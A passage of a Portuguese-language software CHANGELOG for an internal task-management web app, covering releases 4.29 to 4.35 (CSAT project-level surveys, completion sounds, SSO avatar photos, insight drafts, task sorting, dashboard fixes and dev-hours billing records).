| `0.5h`  | `30min`    |
| `12h`   | `12h`      |

Aplicado em `dev-hours-view.html` (página + tooltips de cat-bar) e
`devHoursPdf.js` (KPIs + tabela + totais). Edge cases: zero (`0min`),
sub-hora (só min), exato (só h), arredondamento que estoura 60min vira
+1h.

---

## [4.35.0+20260508-csat-project-level] — 2026-05-08

Release **MINOR** — CSAT no nível do Projeto (override de tipos) + score decimal + recalibragem dev-hours.

### Pedido do user
> "se elas ja estiverem dentro de um projeto, como eu faço? o usuario vai
> esquecer desse cadastro... E teremos também os projetos always on que o
> user vai ter que fechar um marco e disparar csat"

### Mudança
Antes: CSAT era configurado apenas em **task types** (newsletter, apresentação etc).
Projetos longos / always-on não tinham como agrupar pesquisas. Tarefas
órfãs (sem tipo CSAT) ficavam sem coleta.

Agora: cada **projeto** pode ter `csatConfig` próprio com 3 triggers:

| Trigger | Quando dispara |
|---|---|
| `on_close` | User marca status='completed' no projeto |
| `custom_milestones` | Task com `isMilestone=true` é concluída |
| `manual_only` | Apenas via botão "⚡ Disparar CSAT agora" (always-on) |

Quando habilitado, o projeto **substitui** (replace, não soma) qualquer
config de CSAT dos tipos das tarefas dentro dele. Evita disparos duplicados.

### Detalhes técnicos
- Novo campo `projects/{id}.csatConfig` + `lastCsatFiredAt`
- Novo campo `tasks/{id}.isMilestone` + `csatFiredAt`
- `fireProjectCsat(project, {reason, triggerTaskId})` — coleta tarefas
  concluídas desde `lastCsatFiredAt`, cria 1 survey modo `milestone` com
  `taskIds[]`, envia via Cloud Function (Microsoft Graph), atualiza
  `lastCsatFiredAt`
- `fireProjectCsatManual(projectId)` — endpoint pro botão manual
- `triggerCsatOnTaskComplete()` agora checa o override do projeto antes
  de cair no fluxo legacy
- `runPeriodicCsatTrigger` e `listPendingCsatPools` pulam tarefas em
  projetos com CSAT ativo

### Score decimal
Bug correlato corrigido: pesquisa com 4 + 5 não mais arredonda pra 5 —
salva `4.5` (1 casa decimal). UI mostra `4,5/5` em pt-BR. Distribuição
agrupa por bucket arredondado (4,5 → bucket 5).

### Calibragem dev-hours
- `AI_ASSISTANCE_MULTIPLIER` recalibrado: `0.40` → `0.50`
- Projeto retroativo agora cobre 95 dias (02/02/2026 → 08/05/2026):
  adicionadas 2 fases pré-discovery (validação inicial + benchmarks de
  mercado)

### Arquivos
- `js/services/projects.js` — sanitizer + close hook
- `js/services/csat.js` — fireProjectCsat + override
- `js/services/tasks.js` — delegação centralizada
- `js/pages/projects.js` — UI no modal + botão manual
- `js/components/taskModal.js` — checkbox isMilestone condicional
- `js/auth/audit.js` — action `csat.project_fire`
- `js/services/devHours.js` — multiplier 0.50
- `functions/seed-pre-3.0-phases.cjs` — 8 fases (95 dias)
- `csat-response.html` — score decimal

---
































## [4.34.3+20260508-sound-card-subtext] — 2026-05-08

Release **PATCH** — Fix sub-texto dos cards de som no /profile.

### Pedido do user
> "vc nao alterou o texto dos sons que foram inseridos. alguns ainda
> aparecem com 'slot aguardando mp3'"

### Bug
Em `profile.js` o sub-texto dos cards era calculado como:
```js
const slotPending = s.file && !s.synth;
// ...
${slotPending ? 'Slot aguardando MP3' : (s.mute ? 'Sem som' : '')}
```
A condição marcava como "pendente" qualquer som com arquivo,
independente de o arquivo realmente existir. Após 4.34.2 ter copiado
os MP3s reais, todos os sons de arquivo continuavam mostrando o texto
errado.

### Fix
Sub-texto agora vem da `description` do som (já existia em SOUND_LIBRARY,
só não estava sendo usada). Mute mantém "Sem som".

Exemplos:
- Leão rugindo → "Rugido de leão"
- Buzina de palhaço → "Buzina honk-honk"
- Plin → "Tríade ascendente C6→E6→G6 (som original do sistema)."

Texto truncado com ellipsis se passar do width do card; tooltip mostra
descrição completa no hover.

---

## [4.34.7+20260508-tasks-sort-and-expand-all] — 2026-05-08

Release **PATCH** — Tarefas: ordenação configurável + expandir/comprimir
todos os grupos.

### Pedido do user
> "Tarefas: expandir/comprimir todas as tarefas de uma vez só (facilita
> a visualização). opções de ordenar: por ordem alfabetica, por data
> de entrega, etc"

### Mudanças em `pages/tasks.js`

**Ordenação configurável:**
- Novo dropdown "Ordenar:" ao lado do "Agrupar:"
- 9 opções: prazo (asc/desc), alfabética (A-Z/Z-A), criação (recente/antiga),
  prioridade (alta→baixa/baixa→alta), status
- `applySort()` aplicado dentro de cada grupo (e na lista inteira se
  groupBy='none')
- Persistido em `localStorage` ('primetour-tasks-sort')

**Expandir/Comprimir todos os grupos:**
- Botões ⬇ (expand all) e ⬆ (collapse all) na barra de filtros
- Estado global `groupExpandState`: 'mixed' (default — só "Concluídas"
  começa colapsado), 'all' (todos expandidos), 'none' (todos colapsados)
- Click toggla TODOS os `.task-group` na página instantaneamente

### Edge cases
- Tarefas sem `dueDate` ou `createdAt` vão pro fim na ordenação asc,
  pro início na desc — mantém previsibilidade
- localeCompare pt-BR no sort alfabético (acentos respeitados)
- Sort funciona em todos os groupBy modes: dueDate, status, priority,
  project, squad, assignee, none

---

## [4.34.2+20260508-sound-bank-real] — 2026-05-08

Release **PATCH** — Banco real de sons de conclusão (7 MP3s) substitui
slots vazios e amplia catálogo.

### Pedido do user
> "Coloquei uma pasta local pra você atualizar a parte de sons. Chama
> 'Sound Effects'. Atualize/adapte a lista para ter esses sons também
> (e substituir/adaptar o que está sem som). Este será o banco de sons"

### Mudanças no `SOUND_LIBRARY`
- **Slots ativados** (lion, sheep): agora têm MP3 real, deixam de mostrar
  "Slot aguardando MP3"
- **`clown-horn` synth → arquivo**: substituído pelo MP3 real (mais
  autêntico que síntese sawtooth)
- **`dog-bark` removido**: sem arquivo correspondente no banco fornecido
- **Novos sons** (4): explosion 💥, woah 😱, i-got-this 😎, johnny-bacon 🥓

### Arquivos copiados → `assets/sounds/`
| Original                    | Slug              |
|-----------------------------|-------------------|
| Buzinha de palhaço.mp3      | clown-horn.mp3    |
| Explosão.mp3                | explosion.mp3     |
| I got this.mp3              | i-got-this.mp3    |
| Johnny Bacon.mp3            | johnny-bacon.mp3  |
| Leão.mp3                    | lion.mp3          |
| Ovelha.mp3                  | sheep.mp3         |
| woooooaah.mp3               | woah.mp3          |

Total banco: ~440KB (lazy-loaded — só baixa quando preview/seleção).

### Catálogo final (15 sons + mudo)
**Clássicos (6 synth):** plin, sino, carrilhão, pop, tada, sucesso UI
**Divertidos (3 synth):** moeda, level-up, laser
**Divertidos (7 arquivo):** lion, sheep, clown-horn, explosion, woah,
i-got-this, johnny-bacon
**Especial:** mudo

---

## [4.34.1+20260508-sso-avatar-photos] — 2026-05-08

Release **PATCH** — Avatares dos usuários agora puxam foto do Microsoft 365.

### Pedido do user
> "agora que o login é via SSO, você consegue puxar o avatar dos users
> pra substituir nas 'bolinhas' dos nomes? hoje é sigla, mas queria
> que fosse a foto deles."

### Captura da foto
- Após `signInWithMicrosoft()`, faz `GET /v1.0/me/photo/$value` no
  Graph API com o accessToken já capturado.
- Converte response → Blob → resize 96×96 + crop quadrado central →
  base64 JPEG ~10KB.
- Salva em `users/{uid}.photoURL`.
- Atualiza store local pra UI refletir já na sessão atual.
- Falha silenciosa se user não tem foto configurada (Graph 404).

### Helper centralizado
- **Novo:** `js/components/userAvatar.js`
  - `userAvatarInner(user)` — drop-in pra dentro de `<div class="avatar">`,
    devolve `<img>` se tem `photoURL`, senão fallback pra iniciais.
    `onerror` na img remove o elemento e revela as iniciais (nunca quebra).
  - `userAvatarHTML(user, opts)` — wrapper completo pra sites novos.
- `css/components.css` — `.avatar` agora tem `position:relative`+
  `overflow:hidden`; `<img>` filho cobre 100% via `object-fit:cover`.

### Substituições aplicadas (5 lugares mais visíveis)
- `js/components/sidebar.js` — avatar do user logado (rodapé)
- `js/components/header.js` — pílulas de online users
- `js/components/taskPopovers.js` — popover de assignees
- `js/components/taskModal.js` — todos os 9 lugares (assignees,
  comentários, lista de seleção, etc) via helper local `avatarInner(u)`
- `js/pages/kanban.js` — avatares nos cards
- `js/pages/tasks.js` — avatares na lista

Outros call sites (~13 arquivos) seguem com sigla — não bloqueante,
podem migrar gradualmente. Helper único na ponta do funil.

### Compat
- Users sem `photoURL` continuam vendo iniciais (sem mudança).
- Foto é capturada na próxima vez que user faz login SSO. User existente
  sem login ainda na 4.34.1 vê iniciais até relogar.

---

## [4.34.0+20260508-completion-sounds] — 2026-05-08

Release **MINOR** — Banco de sons de conclusão de tarefa configurável por usuário.

### Pedido do user
> "usuarios querem uma perfumaria: poder escolher o som de conclusão das
> tarefas. Pensaram em coisas animadas/memes, como som de leão rugindo,
> buzina de palhaço, ovelha gritando, sino, além de sons clássicos."

### Funcionalidade

**13 sons no catálogo:**

*Clássicos sintetizados (6):*
- ✨ Plin (default — tríade C6→E6→G6, mantém o som original)
- 🔔 Sino (fundamental + harmônicos)
- 🎐 Carrilhão (4 notas em cascata)
- 💭 Pop (noise burst filtrado)
- 🎉 Tada! (fanfarra)
- ✅ Sucesso UI (sweep ascendente)

*Divertidos sintetizados (4):*
- 🪙 Moeda (Mario-like square waves)
- ⬆️ Subiu de nível (RPG-like arpejo)
- 🤡 Buzina de palhaço (honk-honk)
- 🔫 Laser (pew descendente)

*Slots aguardando MP3 (3):*
- 🦁 Leão rugindo (animal real, requer arquivo)
- 🐑 Ovelha (animal real, requer arquivo)
- 🐕 Latido (animal real, requer arquivo)

*Especial:*
- 🔇 Mudo

### Arquitetura
- **Novo:** `js/services/sounds.js` (~280 LOC)
  - Catálogo `SOUND_LIBRARY` com synth + file
  - 10 sintetizadores via Web Audio API (zero dependência)
  - Lazy load + cache em memória pra arquivos MP3
  - Fallback silencioso pro 'plin' se MP3 do slot escolhido não existe
- `js/services/tasks.js` — `playCompletionSound()` delega ao service consumindo `prefs.completionSoundId`
- `js/pages/profile.js` — novo card "Som de conclusão de tarefa" com grid agrupado por categoria (Clássicos / Divertidos / Outros), cada som tem botão ▶ pra preview imediato
- **Novo:** `assets/sounds/` com README explicando como dropar MP3s

### Persistência
- Schema: `users/{uid}.prefs.completionSoundId: string`
- Default: `'plin'` (compat com usuários atuais — sem migração)

### Como adicionar mais sons
1. **Synth**: nova entrada em `SOUND_LIBRARY` com `synth: true` + função em `SYNTH_PLAYERS`
2. **Arquivo**: drop `assets/sounds/{x}.mp3` + entrada em `SOUND_LIBRARY` com `file: '{x}.mp3'`

### Pendência (não bloqueante)
3 slots de animais reais (lion, sheep, dog-bark) ficam **disabled** mostrando "Slot aguardando MP3" até alguém commitar os arquivos. Sites recomendados (CC0): freesound.org, pixabay.com/sound-effects.

---

## [4.33.3+20260508-dev-hours-days-avg] — 2026-05-08

Release **PATCH** — Página pública de horas de dev: cards de total de
dias e média/dia.

### Pedido do user
> "na pagina de horas de desenvolvimento, colocar total de dias do
> projeto e média de desenvolvimento/dia"

### Mudanças em `dev-hours-view.html`
- Calcula janela temporal real (data mais antiga das entradas filtradas
  → hoje), em dias inclusive.
- Novo card **"📅 Dias do projeto"** com subtítulo mostrando a janela
  (ex: "13/03/26 → 08/05/26").
- Novo card **"📊 Média por dia"** = horas totais / dias do projeto,
  em horas decimais.
- Total de cards passa de 4 → 6 (mantém Releases formais e Fases).

### Cálculo
- Janela: `[earliestEntry, max(latestEntry, today)]` — protege contra
  entradas com data futura.
- Mínimo 1 dia (defensivo, evita div/0).
- Atualiza junto com filtros (mês/trimestre/ano) — média do período
  filtrado ÷ dias do filtro.

---

## [4.33.2+20260508-cachebust-r1] — 2026-05-08

Release **PATCH** — Cache-bust de query strings antigas em imports ESM.

Imports tipo `?v=20260503uu1` estavam ignorando bumps recentes (max-age
=600). Atualizado massa para `?v=20260508r1` em 12 arquivos.

Sem mudança funcional — necessário pra que o redesign do bloco
"O que você estava analisando" (4.33.1) chegue ao browser sem aguardar
TTL de 10 min.

---

## [4.33.1+20260508-insight-snapshot-friendly] — 2026-05-08

Release **PATCH** — Bloco "Dados observados" reformulado pra linguagem amigável.

### Pedido do user
> "o sistema apresenta um bloco chamado 'dados observados', mas ainda
> me parece muito técnico, até com mudança de fonte e termos não
> amigáveis ao user. precisamos melhorar isso"

### Mudanças
- **Renomeado**: "📊 Dados observados — foto histórica, imutável"
  → "📌 O que você estava analisando"
- **Sem monospace**: layout em cards com tipografia padrão do app
- **Labels técnicas mapeadas** (em `insights.js`):
  - `weeklyVelocity` → "📈 Tarefas por semana"
  - `csatGeneral` → "★ CSAT geral"
  - `responseRate` → "Taxa de resposta"
  - `avgDays` → "Dias (média)"
  - +20 outras chaves dos 6 dashboards
- **Valores formatados em pt-BR**: números com vírgula decimal, datas
  como "15/04/26", percentuais com %
- **Estrutura visual**: grid de "label → valor", agrupados por grupo
  do widget. Sem chaves aninhadas (`weeklyVelocity[0].weekStart`).
- **Texto explicativo simples**: "Os números acima são salvos junto
  com o insight — assim, mesmo que o dashboard mude, você sempre
  poderá voltar e ver o que motivou a análise."
- **Mensagem da IA**: jargão "ai-edited / audit trail" → "Suas edições
  ficam registradas no histórico, mas a versão original é preservada"
- **Popover de listagem**: mesmo tratamento amigável (badge "📌 O que
  foi analisado" + items compactos com `label: valor`)

### Compat
- Função antiga `formatDataSnapshot()` mantida (PDF/XLSX export ainda
  usa a versão compacta de uma linha)
- Nova função `formatDataSnapshotFriendly()` retorna estrutura
  `[{ label, items: [{ name, value }] }]` pra UI

---

## [4.33.0+20260508-insight-drafts] — 2026-05-08

Release **MINOR** — Rascunhos de insights com auto-save (estilo Outlook/Gmail).

### Pedido do user
> "tenho um pedido para o bloco de insights das análises em todos os
> dashboards: a opção de 'salvar rascunho'. Várias vezes comecei a
> escrever e queria olhar o relatório para conferir algum dado e preciso
> parar, jogar o que escrevi para outro lugar e depois retomar. Pensei
> em uma visualização como do outlook, que fica uma aba na parte de
> baixo com os rascunhos."

### Funcionalidade

**Auto-save no form de insight:**
- Cada keystroke dispara save com debounce de 500ms
- Indicador no rodapé do form: "💾 Rascunho salvo às HH:MM"
- Critério mínimo pra criar draft: 1 char no título OU 10 chars na obs
  (evita criar lixo de typo acidental)
- Salvar oficialmente o insight → deleta o draft
- Botão "Descartar rascunho" remove explicitamente
- Botão de fechar/cancelar mantém o rascunho

**Dock no rodapé:**
- Barrinha fixa: "📝 Rascunhos (N) ▲" — só aparece se há drafts
- Click → expande lista de cards (até 280px altura, scrollable)
- Drafts do dashboard atual aparecem primeiro (destaque visual)
- Cards de outros dashboards: clicar navega pra rota correta + abre form
  (pendência via sessionStorage, expira em 30s)
- ✕ por card → confirma e descarta
- Auto-unmount ao sair de páginas que não são dashboard

**Persistência:**
- localStorage chave `primetour-insight-drafts`
- Máx 20 drafts por usuário (FIFO ao exceder)
- Auto-purge de drafts > 30 dias
- Sync entre abas via storage event nativo

### Arquivos
- **Novo:** `js/services/insightDrafts.js` (~180 LOC) — CRUD + sync cross-tab
- **Novo:** `js/components/insightDraftsDock.js` (~270 LOC) — drawer rodapé
- `js/components/insightsPanel.js` — auto-save + indicador no form,
  param `draft` em `openForm`, expor opener via `window.__primetourInsightForm`
- `js/services/insightWidgets.js` — mount automático do dock em
  `setupDashboardInsights` (todos dashboards ganham de graça)

### Cobertura
Aplicado em todos os dashboards que usam `setupDashboardInsights`:
produtividade, meta, ga, nl, portal, roteiro.

---

## [4.32.2+20260508-recurring-prazo-via-sla] — 2026-05-08

Release **PATCH** — Tarefas recorrentes agora respeitam SLA do tipo de tarefa.

### Pedido do user
> "em tarefas, no modal de criação e edição, campo tarefa recorrente,
> pra que serve o campo prazo (dias após a geração)? ficou confuso.
> muitas vezes o prazo é estabelecido pelo SLA em tipo de tarefa."

### Problema
Existiam dois sistemas paralelos calculando `dueDate`:
- **SLA do tipo** (`slaDays` na variação) — dias úteis
- **`dueOffsetDays` do template recorrente** — dias corridos

A engine recorrente sempre setava `dueDate = occDate + offset` antes de chamar
`createTask()`. Como `createTask` só auto-calc SLA se `dueDate` está vazio, o
SLA do tipo nunca era aplicado em tarefas recorrentes — fonte de verdade
duplicada e divergente.

### Mudança (Opção A — fonte única de verdade)
- Removido o campo "Prazo (dias após geração)" do modal de tarefa recorrente
- Substituído por nota explicativa: prazo vem do SLA do tipo (dias úteis)
- Engine recorrente agora **não passa `dueDate`** — deixa `createTask` calcular
  via `calcSla(typeId, occDate, variationId)`
- Tarefa sem typeId / sem SLA configurado → nasce sem prazo (precisa ajustar
  manualmente, igual modo não-recorrente)

### Compat com templates legacy
Templates criados antes desta versão podem ter `dueOffsetDays > 0`. A engine
ainda respeita o offset **apenas se o tipo NÃO tem SLA configurado** —
caso contrário, o SLA prevalece (single source of truth). Sem migração
de dados necessária.

---

## [4.32.1+20260508-dash-tempo-tipo-newsletter-resolver] — 2026-05-08

Release **PATCH** — Polish do dashboard de produtividade após revisão geral pedida em 4.32.0.

### Correções
- **`getTimePerTaskByType` (Tempo médio por Tipo)** — antes usava o campo legado
  `t.type` com LABELS hardcoded apenas para 'standard'/'newsletter'; tipos
  dinâmicos caíam direto no typeId cifrado como label. Agora usa `t.typeId`
  + `resolveTypeName()` (mesmo resolver do ranking) e merge de órfãos em
  "Outros tipos". Mantém fallback `t.type` para compat.
- **`getNewslettersOutOfCalendar` (widget de Newsletters)** — só pegava
  `t.type === 'newsletter'`. Agora também aceita tasks cujo `t.typeId`
  aponte para um doc Firestore com nome "Newsletter" (case-insensitive).

### Impacto
Widgets afetados — agora mostram nomes amigáveis em vez de IDs:
- ⏱ Tempo por Tarefa / Tipo
- 📧 Newsletters fora do calendário (agora capta tasks novas do tipo)

Combinado com `getProductivityByType` (já corrigido em 4.32.0), todos os
3 widgets baseados em tipo de tarefa agora compartilham o mesmo resolver.

---

## [4.32.0+20260508-csat-fases-2-3-4-dashboard] — 2026-05-08

Release **MINOR** — Fases 2/3/4 do CSAT + revisão geral do dashboard.

### Pedido do user
> "segue e finaliza tudo. vou ver apenas a versão final.
> qdo for para o dashboard, ja faz uma revisao, pq, em tipo de tarefa,
> por exemplo, aparecem varios codigos no lugar do tipo. dash de
> produtividade precisa de uma revisao geral"

### F2 — CSAT periódico (modo `periodic`)
Cliente-side trigger no boot do app (sem Cloud Function por enquanto):
- `runPeriodicCsatTrigger()` em `csat.js`:
  - Itera taskTypes com `csatConfig.mode='periodic'` e `enabled=true`
  - Só dispara se hoje é o `dayOfWeek` configurado
  - Calcula janela do período (weekly/biweekly/monthly) via `periodWindowId`
  - Coleta tarefas done daquele tipo na janela, agrupadas por clientEmail
  - Cria 1 csat_survey por cliente com `taskIds[]` cobrindo todas
  - Chave em `localStorage` ('csat-periodic-runs') previne disparos duplicados
- Wire no `auth.js` boot (após login, async, silencioso)

Caveat: precisa que alguém abra o app no dia configurado. Pra produção
robusta, próxima fase F2.1 deveria ser Cloud Function cron.

### F3 — CSAT milestone (modo `milestone`)
Multi-select de tarefas relacionadas no fechamento:
- Overlay tarefa-concluída detecta `csatConfig.mode='milestone'` e mostra
  seção "🏆 Tarefas que este marco encerra" carregando todas done do mesmo
  projeto (cap 30, pré-marcadas)
- Submit coleta as marcadas e passa `taskIds=[currentTaskId, ...selecionadas]`
  pra `createCsatSurvey`
- Schema `csat_surveys.taskIds[]` (novo, lista de tarefas cobertas; mantém
  `taskId` legacy = primeiro da lista)
- Página /csat lista: badge "🏆 Marco · N entregas" (roxo)

### F4 — Dashboard CSAT redesenhado
Novo bloco "**★ Médias por pergunta (CSAT customizado)**" no topo do
relatório (`renderBottom`):
- `aggregateByQuestion()` agrupa surveys respondidos por `taskTypeId`
  e calcula:
  - Score type → média 1-5 (com cor por faixa: ≥4.5 verde, ≥3.5 amarelo, <3.5 vermelho)
  - Yesno type → % de Sim
  - Text type → contagem de respostas
- Header por tipo: "Newsletter · 12 respostas"
- Bar chart por pergunta com cor + média + N respostas
- Surveys legados (sem questions[]) caem na "Distribuição de Notas"
  tradicional (back-compat preservado)

### Dashboard de Produtividade — fix nomes de tipos
**Bug**: Ranking "Produtividade por Tipo" mostrava typeIds cifrados
(`AOo69uSBifGVU2cf...`, `newsletter`) em vez de nomes amigáveis.

**Causa**: dashboards.js não chamava `loadTaskTypes()` no boot →
`store.get('taskTypes')` vazio → fallback caía no próprio typeId.

**Fix**:
1. `loadData(container)` em dashboards.js dispara `loadTaskTypes()` antes
2. `getProductivityByType` em analytics.js refatorada com `resolveTypeName()`:
   - Doc Firestore por id
   - `STATIC_FALLBACKS` para legacy (`newsletter` → `Newsletter`)
   - Genérico "Outros tipos" como último recurso
3. Merge automático de typeIds órfãos em "Outros tipos" (evita lista poluída)

### Files
- `js/services/csat.js` (createCsatSurvey aceita taskIds + runPeriodicCsatTrigger)
- `js/components/taskModal.js` (overlay milestone multi-select + envio)
- `js/pages/csat.js` (badge milestone + bloco médias por pergunta)
- `js/pages/dashboards.js` (loadTaskTypes no boot)
- `js/services/analytics.js` (resolveTypeName + merge "Outros tipos")
- `js/auth/auth.js` (runPeriodicCsatTrigger no boot)
- `js/version.js`, `index.html`, `CHANGELOG.md`

### Status final do CSAT modular
✅ F1 (perguntas customizadas) · ✅ F2 (periodic client-trigger) · ✅ F3 (milestone) · ✅ F4 (dashboard redesenhado)
🔜 F2.1 (Cloud Function cron) — quando precisar de robustez sem dependência de cliente

---

## [4.31.2+20260508-fix-csat-response-syntax] — 2026-05-08

PATCH — fix bug crítico que travava 100% das páginas de CSAT.

### Bug
Página `csat-response.html` ficava travada em "Carregando pesquisa..."
indefinidamente — modo single OU multi.

### Causa raiz
Código antigo tinha 3 `return` declarations no top-level do
`<script type="module">`:
```js
if (!survey) {
  return showError('...');  // ← SyntaxError: Illegal return statement
}
```
`return` no top-level de **module** é SyntaxError de PARSE — ou seja,
o módulo INTEIRO falha em parsear e nunca executa. Resultado: o
loading spinner inicial do HTML nunca é substituído.

Pré-v4.31 esse bug existia também, mas pode ter mascarado por algum
parser permissivo ou teste insuficiente. Tornou-se visível agora porque
testamos o caminho multi-pergunta.

### Fix
Refatorado para if-else encadeado (não usa `return`):
```js
if (!survey)                      showError('...');
else if (expiresAt < new Date())  showExpired(survey);
else if (survey.status === 'responded') showAlreadyDone(survey);
else                              renderForm(survey, selectedScore);
```

### Files
- `csat-response.html` (raiz — versão usada pelos links de e-mail)
- `js/csat-response.html` (sincronizada)

---

## [4.31.1+20260508-fix-csat-response-path] — 2026-05-08

PATCH — fix: CSAT custom não renderizava multi-pergunta na resposta.

### Bug
Após v4.31.0, surveys com `questions[]` ainda exibiam só 1 pergunta na
página `/csat-response.html`.

### Causa raiz
**Duas cópias do arquivo** no repo: `csat-response.html` (raiz) e
`js/csat-response.html` (subpasta). A v4.31.0 editou só `/js/`. Os links
gerados pelo serviço `csat.js` usam `${basePath}/csat-response.html` que
aponta pra **raiz**.

### Fix
Sincronizadas as duas cópias (`cp js/csat-response.html csat-response.html`).
Cogitar consolidar em uma só fonte numa próxima — por hora, ambas têm o
mesmo conteúdo.

### Files
- `csat-response.html` (sincronizada com a versão de `/js/`)

---

## [4.31.0+20260508-csat-custom-questions] — 2026-05-08

Release **MINOR** — Fase 1 do redesenho do CSAT.

### Pedido do user
> "Separar CSAT de newsletter (conteúdo e design - duas perguntas) e
> outra pra outras entregas do marketing. Acrescentar uma function de
> CSAT vinculada ao tipo de tarefa, no intuito de personalizar o CSAT,
> caso necessário."

### Implementação (Fase 1 — perguntas customizadas por tipo)
**Schema** — novo bloco `csatConfig` no documento do tipo de tarefa:
```
csatConfig = {
  enabled: bool,
  mode: 'individual' | 'periodic' | 'milestone',  // F1: só individual ativo
  period: 'weekly' | 'biweekly' | 'monthly',
  dayOfWeek: 0-6,
  periodLabel, customMessage,
  questions: [{ id, label, type:'score'|'text'|'yesno', required }],
}
```

**UI no admin** (/task-types modal): nova seção "★ Pesquisa de satisfação"
em accordion com:
- Toggle "Habilitar CSAT customizado"
- Radio do modo (Individual ativo; Periódico/Marco em breve)
- Bloco condicional pra cadência + dia da semana (se modo=periodic)
- Mensagem custom do e-mail
- Lista editável de perguntas (label + tipo + obrigatório + remover)

**Schema do `csat_surveys`** — novos campos:
- `taskTypeId` (snapshot de origem)
- `questions[]` (cópia das perguntas no momento do envio)
- `responses` (map qId → value)
- `csatMode`
- Mantidos `score`/`comment` legados — calculados como média/concat das
  respostas tipo score/text na resposta multi (back-compat com listagem)

**`createCsatSurvey`** lê `taskType.csatConfig` no momento da criação e
faz snapshot das perguntas no doc da survey (imutável após envio).

**`respondCsatSurvey`** detecta multi pelo `questions.length > 0` e:
- Valida required por tipo (score 1-5, yesno yes/no, text não-vazio)
- Calcula `score` derivado (média dos scores) e `comment` derivado
  (concat dos textos com prefix do label)

**`csat-response.html`** (página pública) detecta `survey.questions[]`:
- Modo single (legado): UI atual inalterada
- Modo multi: render N perguntas em sequência com:
  - Score: 5 botões emoji
  - Yes/no: 2 botões coloridos (👍 verde / 👎 vermelho)
  - Text: textarea
  - Auto-fill da primeira `score`-question com URL `?score=N`
  - Validação client-side com scroll-to-error

**Overlay tarefa-concluída** mostra preview das perguntas customizadas
do tipo (caixa dourada com lista das N perguntas e seus tipos).

**Página /csat (lista)** renderiza breakdown por pergunta nos surveys
multi (com badge "★ CSAT custom" + lista de respostas com cores).

### Não-objetivos (próximas fases)
- **F2**: Modo `periodic` (cron Cloud Function semanal + agregação)
- **F3**: Modo `milestone` (multi-select no fechamento)
- **F4**: Dashboard CSAT redesenhado (médias por pergunta, alertas,
  filtros rotina/projeto)

### Files
- `js/services/taskTypes.js` (csatConfig + sanitizer)
- `js/pages/taskTypes.js` (UI accordion CSAT + handlers)
- `js/services/csat.js` (snapshot + respondCsatSurvey multi)
- `js/csat-response.html` (renderMultiForm + multi submit)
- `js/components/taskModal.js` (passa taskTypeId + preview perguntas)
- `js/pages/csat.js` (render breakdown multi)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [Governança 4.30.x] — 2026-05-08

Atualização do registro de Horas de Desenvolvimento (`dev_hours`):

### Pedido do user
> "atualizou doc tecnico e horas de desenvolvimento? aliás, todos os titulos
> do horas de desenvolvimento precisam ser mais user friendly. estao
> extremamente tecnicos. quem aprova o custo é uma pessoa de financeiro.
> ela precisa ter um vocabulário mais amistoso para os nossos sprints"

### Operação realizada (via browser console, master-only write)
1. **31 entradas criadas** (releases 4.10 → 4.30) — gap de registro descoberto
   (última entry antes era 4.7.0)
2. **29 títulos reescritos** em entries antigas — removido jargão técnico
   ("PIVOT Vision-first", "BREAKTHROUGH SFMC", "TDZ shadow", "fetchTasks vs
   subscribe") e substituído por linguagem de negócio ("Análise de
   newsletters por imagem", "Correlação automática entre envios e
   materiais", "Correção: filtros persistiam ao navegar")

### Princípios da reescrita
- Foco no VALOR ENTREGUE, não na implementação
- Sem siglas internas (SOAP, ADR, TDZ, schema)
- Sem nomes de funções/arquivos
- Subtítulo curto pode trazer contexto técnico, mas o título principal
  é sempre amigável
- Mesmo correções pequenas devem ser entendíveis ("Correção ortográfica"
  em vez de "Fix typo saiuram → saíram no banner")

### Totais finais (após operação)
- 65 entradas aprovadas
- 757,67 h
- R$ 113.650,50 (taxa R$ 150/h)

### Files
- Apenas dados Firestore (collection `dev_hours`) — sem mudança de código
- Este CHANGELOG entry registra a operação de governança

---

## [4.30.0+20260508-goals-accordion] — 2026-05-08

Release **MINOR** — página de Metas com accordion de 2 níveis.

### Pedido do user
> "página metas: deixar os quadros de metas e pilares fechados,
> estilo acordeon"

### Implementação
**Antes**: cards de meta listavam todos os pilares e suas metas EXPANDIDOS,
gerando muito scroll quando havia muitas metas.

**Agora**: 2 níveis de accordion, ambos FECHADOS por default:

1. **Card da meta** (nível 1):
   - Header sempre visível: chevron ▸ + status + scope + título + contagens
   - Click no chevron OU no título alterna a expansão
   - Quando expande: chevron rotaciona 90° + cor dourada
   - Pilares ficam ocultos por padrão

2. **Pilar** (nível 2, dentro do goal expandido):
   - Header sempre visível: chevron ▸ + "Pilar N · Título" + ponderação% +
     contador "N metas" no canto direito
   - Click toggle expande as metas individuais (chips em pílula)
   - Independente de outros pilares (cada um abre/fecha sozinho)

### UX
- Estado inicial sem scroll desnecessário — user vê apenas headers
- Cliques são rastreáveis (chevron OU título de meta = toggle)
- Pilares dentro do goal mantêm comportamento independente
- Estado de expansão NÃO persiste entre re-renders (intencional — ao
  publicar/editar/excluir uma meta, todos voltam ao fechado)

### Files
- `js/pages/goals.js` (renderGoalsList: chevron + handlers + display:none default)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.29.1+20260508-fix-selmeta-undefined] — 2026-05-08

PATCH — fix bug do overlay de tarefa concluída.

### Bug
Após o refactor multi-select da v4.29.0, ao confirmar 2+ metas no overlay
"Tarefa concluída", o botão **Confirmar travava em "⏳"** indefinidamente.

### Causa raiz
Resíduo de uma referência à variável antiga `selMeta` (single-select)
que tinha sido renomeada pra `selMetas` (array) no resto do refactor:
```js
if (regMeta && selMeta) toast.success(...);  // ← selMeta não existia
```
Esse `ReferenceError` interrompia o handler **DEPOIS** do save no Firestore
ter sucesso (a tarefa era atualizada, mas o `overlay.remove()` nunca era
chamado e o botão ficava travado).

### Fix
Substituído por `selMetas.length || hasMetaLinks` + mensagem dinâmica
("Evidência registrada (N metas)!" quando 2+).

### Files
- `js/components/taskModal.js` (linha 4319 do branch confirm)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.29.0+20260508-goals-filter-rename-overlay] — 2026-05-08

Release **MINOR** — 3 melhorias em metas pedidas pelo user.

### 1) Meu Painel — "Minhas Metas" só mostra metas vinculadas ao user
**Bug**: Card "◎ Minhas Metas" mostrava TODAS as metas do sistema. Causa:
`fetchGoals({ type:'personal' })` ignorava o filtro (a função não aceita
parâmetros). Resultado: card aparecia pra todo user, mesmo sem vínculo.

**Fix**: filtra client-side via `getResponsavelIds(goal)` (cobre formato
novo `responsavelIds[]` e legado `responsavelId`). Apenas metas onde o
user é responsável aparecem agora.

